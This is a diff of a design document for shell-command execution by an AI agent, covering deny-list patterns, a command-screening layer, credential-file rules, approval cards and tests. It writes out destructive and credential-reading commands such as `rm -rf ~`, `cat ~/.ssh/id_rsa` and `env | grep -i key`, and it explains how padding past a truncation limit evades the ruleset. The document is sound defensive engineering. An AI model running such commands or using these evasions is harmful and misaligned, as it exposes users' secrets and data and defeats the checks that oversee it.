+| **Credential filenames**                 | **screen:** any token whose leaf name satisfies `isSensitiveFileName`. **floor:** **two** rows per entry — `*<entry>` and `*<entry> *` — plus a THIRD form `*<entry>.*` for **prefixes only**, and for the explicit `.env` case. The third form is what covers a dotted variant, and `.env` is the reason it exists: `.env` is **not** a suffix, prefix or exact entry in `SENSITIVE_FILE_RULES`, so the first two forms emit nothing for it at all. Machine-checked against `Wildcard.match`: `*.env` matches `cat .env` but **not** `cat .env.local`; `*.env *` matches neither (it needs a trailing argument); `*.env.*` matches `cat .env.local` but not `cat .env`. So `.env` gets its own explicit `*.env` + `*.env *` + `*.env.*` triple. ⚠️ **Do not collapse it to `*.env*`** — that fires on `echo x.envelope`. |
+
+⚠️ **And do not emit the third form for `suffixes` or `exact`.** The three groups in `isSensitiveFileName` use three DIFFERENT predicates (`:879-890`): `prefixes` is `startsWith`, so `*<entry>.*` is faithful; but `suffixes` is `endsWith` and `exact` is equality, and `*<entry>.*` silently converts an end-anchor into an infix and equality into a prefix. Machine-checked, that over-generalisation refuses thirteen probe files the source rule calls **not** sensitive — `cert.pem.bak` and `tls.pem.example` via `*.pem.*`, `docs/credentials.md` via `*credentials.*`, `server.key.tpl` via `*.key.*`, `.htpasswd.example`, `.netrc.sample`, `.pgpass.template`. A floor row is not a soft signal: §9.3 returns `status="refused"` with **no approval card**, so each of those is unappealable. | The policy is `SENSITIVE_FILE_RULES` plus the `.env` / `.env.*` case, which `isSensitiveFileName` special-cases in its first check (`path-validation.ts:854-871` and `:879-890`, the `.env` branch at `:881`) — **reference it, do not retype it here.** The broker already applies it to _reads_; a command must not be the way around a rule the read path enforces. An earlier draft retyped it and dropped eleven of its entries; a later one derived floor rows from it mechanically and emitted **zero** for `.env`. |
+
+**The floor is coarser than it looks, in both directions, and that is the point.**
+`*sudo *` also fires on `git commit -m "no sudo here"`, and `*shutdown *` also fires
+on a commit message containing the word `shutdown` — both machine-checked against
+`Wildcard.match` (`rules.py:98-101`). A glob with no word boundaries cannot tell a
+binary from a substring. **Over-refusal here does NOT "cost a click" — it costs the
+command.** §9.3 returns `status="refused"` and creates no approval card, so a floor
+row is unappealable by construction; there is nothing to approve past. That is why
+these rows are kept deliberately narrow, and why §9.3, which tokenises, is the
+mechanism that decides rather than the floor.
+
+**`Wildcard.expand` is a trap here, not a convenience.** It rewrites a **leading**
+`~` / `$HOME` — and only as a whole first segment — into the host home path, once,
+at config-parse time (`rules.py:104-122`); its own docstring is explicit that a `~`
+in the middle of a pattern _"is left alone (it is a literal there)"_. The command
+**text** is never expanded: the child shell expands it at exec time, so the subject
+still contains a literal `~`. A row authored `~/.ssh/**` is therefore rewritten to
+`/Users/<me>/.ssh/**` and is now guaranteed never to meet the `~` the model typed —
+pattern and subject cannot agree on that row class in either direction. A row
+authored `*/.ssh/*` is left alone and works. **Every floor row must begin with `*`
+or with a literal binary name.** §16.2 pins both halves of this so the path-shaped
+form cannot be reintroduced.
+
+### 9.3 The pre-PDP lexical screen — the primary mechanism
+
+**This screen decides; `_never` is the floor underneath it.** §9.2 is the argument:
+a `PermissionRule`'s subject half is one glob `fullmatch`ed against one opaque
+string (`rules.py:148-153`), with no tokenisation, no word boundaries, no
+alternation and no character classes, so it cannot express "in command position" — the property that separates `sudo rm -rf /`
+from `git commit -m "no sudo here"`. The screen runs on the raw command string
+before the PEP is entered, so it can tokenise, and it therefore carries every row
+in §9.2's table at full fidelity.
+
+Keeping `_never` as well is not theatre. It is authored from the same data table,
+it survives a bug in the screen, and it is the rung `PdpPolicyService` evaluates
+above every rule and above every posture (§9.1) — so it is the thing that holds if
+someone one day wires a second call path that skips the screen. But when the two
+disagree, the screen is the answer, and because the screen runs first, a hit means
+**no approval card is ever created** (AC7.1).
+
+Two further properties of the ruleset — beyond §9.2's fullmatch shape — make that
+ordering necessary, and both are real limits, verified:
 
 1. **Subjects are truncated at 1024 characters.** `PolicySubjects._MAX_CHARS = 1024`
    and `subjects.append(trimmed[: cls._MAX_CHARS])` (`rules.py:342, 355`). Our
    `command` field allows 8192. **A never-pattern anchored past character 1024 will
-   not match**, so `<1000 bytes of padding> ; rm -rf ~` evades the ruleset.
+   not match**, so a long enough prefix evades the ruleset. ⚠️ The obvious example does **not** work: `<1000 bytes of padding> ; rm -rf ~` is 1011 characters, under the cap, so it is not truncated and the row _does_ fire. The evasion needs a prefix past **1013** bytes; machine-check any example before quoting it.
 2. **Backslashes are rewritten to forward slashes before matching.**
    `Wildcard.match` does `value.replace("\\", "/")` and compiles with `re.DOTALL`
    and `fullmatch` (`rules.py:101, 126-133`). A shell-escaped `r\m` is not
    normalised, but a Windows-style path is mutated before the rule sees it.
 
-So `capabilities/shell/never_list.py` also exposes a **pre-PDP screen** that runs on
-the _full, untruncated_ command string before the PEP is entered, applying the same
-row set with the same anchoring. Two screens, one data table — never two tables.
-A hit returns `RunCommandResult(status="refused")` and **no approval card is ever
-created** (AC7.1).
+So `capabilities/shell/never_list.py` owns both: the **screen**, which runs on the
+_full, untruncated_ command string before the PEP is entered, and the **compiled
+`_never` rows** it derives for the floor. One data table, two readers — never two
+tables, because a second table is a second thing to keep correct and it is the copy
+that will be forgotten. A screen hit returns `RunCommandResult(status="refused")`
+and **no approval card is ever created** (AC7.1).
 
 ### 9.4 Say plainly what the never-list is for
 
@@ -935,10 +1101,10 @@ Five further reasons a bolt-on does not work, each grounded:
    knowing which path is about to change. A command string is not analysable for
    that.
 4. **The honesty channel has no analogue.** `MAX_CAPTURE_BYTES = 8 MiB` decided by
-   `os.lstat` gives "recorded, not revertible" (`write_journal.py:75-82`). A command
+   `os.lstat` gives "recorded, not revertible" (`write_journal.py:75-79`). A command
    appending 900 MB has no `st_size` to consult.
 5. **The audit story would invert.** `tool_call_outcome` still fires
-   (`runtime_worker/audit.py:28`), so the audit log would say _a command ran and
+   (`runtime_worker/audit.py:27`), so the audit log would say _a command ran and
    succeeded_ while the change ledger says _nothing changed_. Two systems
    disagreeing, with the trusted one wrong, is a worse compliance posture than no
    logging.
@@ -959,7 +1125,7 @@ is not stated:
 3. **The Changes tab**, as a non-dismissible notice naming the count (AC4.1–4.3).
    `HostWritesTab`'s own header already carries the honesty discipline this needs:
    _"THE OUTCOME IS RENDERED, ALWAYS … a group whose undo restored nothing says so
-   rather than looking successful"_ (`packages/chat-surface/src/workspace/HostWritesTab.tsx:34-41`).
+   rather than looking successful"_ (`packages/chat-surface/src/workspace/HostWritesTab.tsx:35-40`).
    A tab that lists three journaled edits while silently omitting a `make clean` is
    the same failure that comment exists to prevent.
 
@@ -1045,15 +1211,23 @@ wrapper (`local.py:1557-1620`).
 invariant's whole design is that provider keys ride
 `AgentRuntimeContext.provider_keys` with `exclude=True, repr=False` so they "never
 appear in `runtime_context_json`, queue/outbox payloads, events, or reprs"
-(`docs/architecture/04-security-invariants.md:80-96`). The worker **process** still
-holds them, plus `COPILOT_BROKER_TOKEN` (the loopback broker bearer,
-`capabilities/desktop/broker_client.py:12-16`) and `ENTERPRISE_SERVICE_TOKEN`.
-`env | grep -i key` would print all of it.
+(`services/ai-backend/docs/architecture/04-security-invariants.md:80-96`). The worker **process** still
+holds them, plus the loopback broker bearer — `DESKTOP_WORKSPACE_BROKER_TOKEN`,
+with `DESKTOP_BROKER_TOKEN` as the legacy fallback (`_Env.BROKER_TOKEN` /
+`_Env.LEGACY_BROKER_TOKEN`, `capabilities/desktop/workspace_backend.py:160,162`) —
+and `ENTERPRISE_SERVICE_TOKEN`. `env | grep -i key` would print all of it.
 
 So: **allowlist, not denylist**, and the test must fail if anyone inverts it
 (AC6.2). Hermes uses a tiered denylist (`local.py:531-572`) and openly documents
 deliberate non-strips; a denylist is the wrong default for us because our secret
 set grows with every provider we add.
+
+⚠️ **Do not let the test be a list of names.** Those two names are the ones the
+supervised worker actually receives today; both were misspelt in an earlier draft
+of this PRD as a single invented `COPILOT_BROKER_TOKEN`, which greps to zero hits
+repo-wide. A denylist-shaped assertion over a name that does not exist is green and
+proves nothing — hence AC6.2's novel-secret variant, which is the property, and
+AC6.1, which is only the pin.
 
 v1 allowlist:
 
@@ -1122,7 +1296,7 @@ must be designed, not waved at: `git` loses `~/.gitconfig`, `npm` loses `~/.npmr
 `pyenv`/`nvm`/`cargo` break. The mitigation is an explicit opt-in **config
 passthrough**: a named list of files copied read-only into the scratch home at
 command start. **`.npmrc` can contain `_authToken`** — so every passthrough file
-runs through the `isSensitiveFileName` equivalent (`path-validation.ts:879-884`) and
+runs through the `isSensitiveFileName` equivalent (`path-validation.ts:879-890`) and
 a file containing a credential-shaped line is refused with a message naming it,
 never silently copied. Raised here deliberately: this is the hard edge case in
 Phase 2 and it must not be simplified away.
@@ -1163,7 +1337,7 @@ Two reasons.
 - Security invariant §7: subagents are deliberately isolated, and _"a subagent
   receiving a full history can exfiltrate information from prior turns"_
   (`04-security-invariants.md:118-129`). Subagents already inherit the parent's
-  filesystem permissions (`capabilities/desktop/host_tool_paths.py:163-167`). Adding
+  filesystem permissions (`capabilities/desktop/host_tool_paths.py:164-167`). Adding
   execution multiplies the doors by the fleet width.
 - Product: a fleet of four subagents each parking on a command approval is four
   decisions the user cannot sequence or reason about. The machinery to render that
@@ -1247,15 +1421,15 @@ properties are the ones a command approval needs:
 
 Mapping:
 
-| Prop              | Value for a command                                                                                                                                                                                            |
-| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `title`           | `Run \`pytest -q\` in my-project` — verb-first, grant **label**, never a host path                                                                                                                             |
-| `connector`       | `null` — there is no vendor                                                                                                                                                                                    |
-| `access`          | `null` — `read`/`write` is not a claim we can make about a command                                                                                                                                             |
-| `irreversible`    | **`true`, always** — a command's changes are outside undo (§10.2), which is precisely what this flag means. This also means **no command is ever approvable in one click**, which is the right default for v1. |
-| `reason`          | the model's stated purpose, already length-capped and newline/markdown/URL-stripped by the gate (`surfaces_v2/gate.py:18-24`)                                                                                  |
-| `onApproveAlways` | supplied **only** when §8.3's simple-command test passes                                                                                                                                                       |
-| `params`          | not the vehicle for the command text — see below                                                                                                                                                               |
+| Prop              | Value for a command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `title`           | `Run \`pytest -q\` in my-project` — verb-first, grant **label**, never a host path                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| `connector`       | `null` — there is no vendor                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| `access`          | `null` — `read`/`write` is not a claim we can make about a command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| `irreversible`    | **`true`, always** — a command's changes are outside undo (§10.2), so **no command is ever approvable in one click**. ⚠️ **Carried by `risk_level: "high"`, never by `op_class`.** `buildIrreversible` is `op_class === "destructive" \|\| risk_level ∈ {high, critical}` (`approvalProjection.ts:650-658`), so **either** field would draw the card — this is a choice between two live options, not a workaround for a stripped one. Pick `risk_level` because `op_class: "destructive"` additionally costs §8.3's always-grant on the server; see the ⚠️ below. **Know which projection branch you are on:** taking the write gate's wire shape — `approval_kind = "ask_a_question"` (`gate.py:132`, set at `:449`) — makes `_approval_requested_payload` **early-return at `events.py:2513-2514`** into `_ask_a_question_requested_payload` (`:2669-2736`), a **different** allow-list, and that one projects `op_class` (`:2700`), `risk_level` (`:2701`) **and** `grant_options` (`:2725-2729`). Its own comment records that dropping the first two once _"made the client's whole irreversible lane unreachable"_ (`:2687-2699`). §18's first closed-set item is where that branch is chosen; do not re-derive it here. |
+| `reason`          | the model's stated purpose, already length-capped and newline/markdown/URL-stripped by the gate (`surfaces_v2/gate.py:18-24`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| `onApproveAlways` | supplied **only** when §8.3's simple-command test passes                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| `params`          | not the vehicle for the command text — see below                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
 
 **Two additions are needed and neither exists today:**
 
@@ -1272,6 +1446,29 @@ Mapping:
    _"Changes made by a command can't be undone from here."_ Not a chip and not a
    hover — §10.2's second of three places.
 
+**⚠️ `irreversible` and `op_class` must stay decoupled, or §8.3's control is
+structurally undrawable.** `ToolAccessGate._grant_options` withholds `allow_always`
+for exactly one op class — `destructive` (`surfaces_v2/gate.py:470`, branch at
+`:501-503`). If the command lane reached for `op_class: "destructive"` in order to
+get an irreversible-looking card, the server would emit
+`grant_options: ["allow_once"]` on **every** command card, "Allow for this run"
+would never be offered, and no client change could recover it: the option the client
+draws is the option the server sent. So the two knobs live on two sides of the wire
+and answer two different questions:
+
+- **Server, `op_class`:** _may this decision cover more than this call?_ The command
+  lane carries a **new `op_class: "execute"`** (`_Values.OP_CLASS_EXECUTE`, alongside
+  the existing read / write / destructive at `gate.py:117-118,140`), and
+  `_grant_options` gains one rule for it — `allow_always` **only** when §8.3's
+  simple-command test passed, `[allow_once]` otherwise. That is a **signature
+  change**: today it is `_grant_options(op_class: str)` and the op class is all it
+  knows, so the simple-command verdict has to be threaded in.
+- **Client, `risk_level`:** _may this be approved from the collapsed card?_ Always
+  `no` for a command, via `buildIrreversible`'s risk arm.
+
+v1's answers are therefore `no` and `yes-if-simple` — which is only expressible
+because these are two fields, not one.
+
 **⚠️ Do NOT invent a bespoke `api_event_type`.** The payload must ride
 `approval_requested` (`runtime_api/schemas/common.py:150`), with the discrimination
 carried in `approval_kind`. `WorkspaceGrantValues.EVENT_TYPE` documents what happens
@@ -1282,7 +1479,7 @@ is never told about — a hang"_ (`capabilities/desktop/workspace_grant.py:83-10
 
 **⚠️ The producer branch must recognise the tool name.** `stream_events.py:1176`
 tests membership in `_FilesystemApproval.TOOL_OPERATIONS` (which lists only
-`ls/read_file/glob/grep/write_file/edit_file`, `:133-145`) and `:1197` then does
+`ls/read_file/glob/grep/write_file/edit_file`, `:133-142`) and `:1197` then does
 `if action_name != McpValues.ToolName.CALL_MCP_TOOL: continue`. **An interrupt
 raised on `run_command` today produces no card and an infinite spin** — the exact
 live symptom recorded in the comment at `:1177-1185`. A third producer branch for
@@ -1417,7 +1614,7 @@ explicit statement that the change set is unknown.
 ### 15.3 Audit
 
 `tool_call_outcome` and `approval_decision` already fire from
-`runtime_worker/audit.py:20-30`, so a command inherits both.
+`_Actions`, `runtime_worker/audit.py:26-27`, so a command inherits both.
 
 Add one action: **`shell.command_executed`**, carrying `run_id`, `org_id`,
 `user_id`, the **hash** of the command plus its first 256 characters, the workspace
@@ -1453,10 +1650,10 @@ tempting to drop.
 ### 16.1 Policy and posture
 
 - `EXECUTE` axis default is `ask`; a snapshot missing the axis falls back to `ask`,
-  not `auto` (`ToolUsePolicySnapshot.mode_for_kind`, `permissions.py:84-90`).
+  not `auto` (`ToolUsePolicySnapshot.mode_for_kind`, `permissions.py:80-86`).
 - **`Posture.BYPASS` does not auto-run a command.** Both postures asserted.
 - An `EXECUTE: block` workspace policy denies, and BYPASS does not lift it
-  (`service.py:335-337`).
+  (`service.py:338-339`).
 - `gate is None` ⇒ typed refusal, never dispatch (`policy_tool.py:20-27`).
 - Grant detached mid-run ⇒ call-time recheck returns `unavailable`, no fallback root.
 
@@ -1465,6 +1662,17 @@ tempting to drop.
 - Golden corpus of `(command, expected)` pairs, **including a `known_miss` class**
   that is asserted to be missed, so the suite cannot be read as a boundary claim
   (AC7.4).
+- **A path-shaped row is inert, and the test says so out loud.** One test, two
+  halves: a `_never` row authored `~/.ssh/**` — the natural and wrong form — is
+  asserted **not** to refuse `cat ~/.ssh/id_rsa`; the whole-command row `*/.ssh/*`
+  is asserted **to** refuse it. The first half is the important one. It pins the
+  mechanism (`Wildcard.match` fullmatches the whole subject, `rules.py:98-101`;
+  `Wildcard.expand` rewrites the pattern's leading `~` and never the command text,
+  `rules.py:104-122`) so the path-shaped form cannot be quietly reintroduced by an
+  edit that looks like a readability improvement.
+- **No floor row expands.** Every row emitted for `_never` by
+  `capabilities/shell/never_list.py` is asserted to survive `Wildcard.expand`
+  byte-identically — i.e. none of them begins with `~` or `$HOME` (§9.2).
 - A user rule `{"pattern": "*", "action": "allow"}` in the never ruleset does **not**
   lift `rm -rf /` — the last-match-wins ordering trap (§9.5).
 - Never-list hit ⇒ **no `approval_requested` event is appended.** Assert on the
@@ -1473,9 +1681,11 @@ tempting to drop.
   screen even though `PolicySubjects` would truncate it away (`rules.py:342, 355`).
 - **Backslash rewrite:** a command whose match depends on a literal `\` behaves as
   specified given `Wildcard.match`'s `replace("\\", "/")` (`rules.py:101`).
-- `git commit -m "block rm -rf / in CI"` is **not** refused — the never-list is
-  anchored to command position, so the phrase as data must pass (Hermes' `_CMDPOS`,
-  `approval.py:381-392`).
+- `git commit -m "block rm -rf / in CI"` is **not** refused — the phrase as data
+  must pass. Command position is a property only the §9.3 screen has (Hermes'
+  `_CMDPOS`, `approval.py:381-392`); the `_never` floor has no word boundaries at
+  all, so this asserts two things at once: that the screen tokenises, and that the
+  floor rows are narrow enough not to fire on it.
 
 ### 16.3 Adversarial
 
@@ -1576,10 +1786,43 @@ Three blocks live in `execution/deep_agent_builder.py` today and the selection a
 
 ### Phase 0 — Prerequisites (no user-visible change)
 
-- `EXECUTE` axis in `services/backend` + `api-types` + the runtime mirror (§6).
+- `EXECUTE` axis in `services/backend` + `api-types` + the runtime mirror (§6),
+  **including the `_posture_decision` rung between 3.5 and 3.6** — the enums alone
+  leave BYPASS auto-running commands (§6).
 - The third producer branch in `runtime_worker/stream_events.py` so a command
   interrupt renders a card instead of hanging (§14.1).
+- **Three closed sets between that producer and the card.** Each is a _filter_, not
+  a passthrough, and each fails by producing a plausible-looking card rather than an
+  error — which is why they belong on a checklist and not in someone's head:
+  - **The projection allow-list — and there are two of them, chosen by
+    `approval_kind`.** `runtime_api/schemas/events.py::_approval_requested_payload`
+    (`:2511`) is the one you will find first, and its key tuple is `:2516-2543`.
+    But it **early-returns at `:2513-2514`** into
+    `_ask_a_question_requested_payload` (`:2669-2736`, key tuple `:2677-2702`) for
+    `approval_kind == "ask_a_question"` — which is exactly the value the existing
+    write gate sets (`gate.py:132`, used at `:449`). So this bullet and the
+    `mapApprovalKind` bullet below are **one decision, not two**: reuse the write
+    gate's kind and the command lane lands on the `:2677-2702` list (adding
+    `command` / `workspace_label` at `:2516-2543` then changes nothing — the
+    checklist item passes and the card stays blank); invent a new kind and it lands
+    on `:2516-2543` but falls through `mapApprovalKind` to `"unknown"`. Whichever
+    is chosen, **name the branch in the ticket and add the keys to that list.** Not
+    hypothetical: `approvalProjection.ts:586-589` records `category` and `vendor`
+    being dropped by exactly this class of list, and `op_class` / `risk_level`
+    (`events.py:2687-2699`) and `grant_options` (`:2717-2724`) each had to be added
+    to the `ask_a_question` branch after the same silent strip.
+  - `mapApprovalKind`
+    (`packages/chat-surface/src/destinations/run/approvalProjection.ts:547-560`) is a
+    **closed switch** over `mcp_tool | mcp_auth | ask_a_question | tool_action`. A new
+    `approval_kind` for the command lane falls through to `"unknown"`.
+  - `allowsRunScopedGrant` (`approvalProjection.ts:706-714`) requires the approval id
+    to start with `WRITE_GATE_APPROVAL_PREFIX = "mcp_write:"` (`:235`). A
+    `shell_exec:` id never offers "always" — so §8.3's control is undrawable on the
+    client too, independently of the server-side `op_class` issue in §14.1. Decide
+    deliberately whether the command lane reuses the `mcp_write:` id shape or the
+    predicate learns a second prefix.
 - `TcWriteGateRow.commandText` + the no-undo line (§14.1).
+- `_Values.OP_CLASS_EXECUTE` + the `_grant_options` signature change (§14.1).
 - `outputPreview` on `ToolCallEntry` and the `reduceToolDelta` change (§14.2).
 - The `"command"` entry in `toolViews.tsx` (§14.2).
 
@@ -1656,6 +1899,16 @@ Stated so nobody inherits a guess as a fact.
 
 - **I read source; I ran nothing.** No test was executed, no `isinstance` check
   observed live, no packaged app driven.
+- **Every deepagents citation here was read at 0.7.1; the service pins 0.7.4.**
+  `services/ai-backend/requirements.in:35` and `services/ai-backend/pyproject.toml:11`
+  both say `deepagents==0.7.4`, while the venv this PRD was read against holds
+  `deepagents-0.7.1.dist-info`. §2.1's `FilesystemMiddleware.__init__` raise
+  (`filesystem.py:1436-1443`), `_all_paths_scoped_to_routes` (`:409-424`) and
+  `supports_execution` (`:1192-1211`) are therefore 0.7.1 line numbers **and** 0.7.1
+  behaviour. Those three are the load-bearing "we cannot derive this from
+  deepagents" finding, so re-read them against 0.7.4 before Phase 0 starts. A PRD
+  that reasons about deepagents behaviour has to say which version it read; this one
+  read the older one.
 - **"`execute` is absent on the desktop backend today"** is derived from
   `supports_execution` (`filesystem.py:1192-1211`) plus the absence of a `def execute`
   on `HostFilesystemFloor`, `NativeHostPathBackend` and `FilesystemBackend` — not
